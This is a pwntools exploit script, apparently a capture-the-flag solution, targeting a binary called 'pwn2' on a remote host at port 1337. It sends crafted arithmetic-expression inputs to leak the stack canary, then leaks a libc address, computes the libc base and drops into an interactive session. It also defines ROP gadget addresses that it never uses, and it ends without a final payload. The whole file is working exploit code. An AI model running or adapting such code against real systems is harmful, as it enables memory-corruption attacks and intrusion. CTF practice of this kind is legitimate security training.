from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('pwn2')
r= e.process()
r = remote('172.188.64.101', 1337)
lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')
ret =0x0000000000400646
pop_rdi= 0x0000000000401343
main =0x40121F

payload = (str(ret)+ "+")*8 + str(ret) + "*(" +str(ret) + ")*"
pause()
r.send(payload)
canary= int(r.recvline().strip())
log.info("canary: %#x" %canary)


bef = "("
aft = ")"
payload= ""
payload += "*"+bef+str(1)+aft
payload += "*"+bef+str(2)+aft
payload += "*"+bef+str(3)+aft
payload += "*"+bef+str(4)+aft
payload += "+"+str(canary)+aft
payload += "-"+bef+str(canary)+aft
payload += "*"+bef+str(7)+aft
payload += "/"+bef+str(8)+aft

pause()
r.send(payload)
leak= int(r.recvline().strip())
log.info("leak: %#x" %leak)
libc = leak-0x272040
log.info("libc: %#x" %libc)
r.interactive()
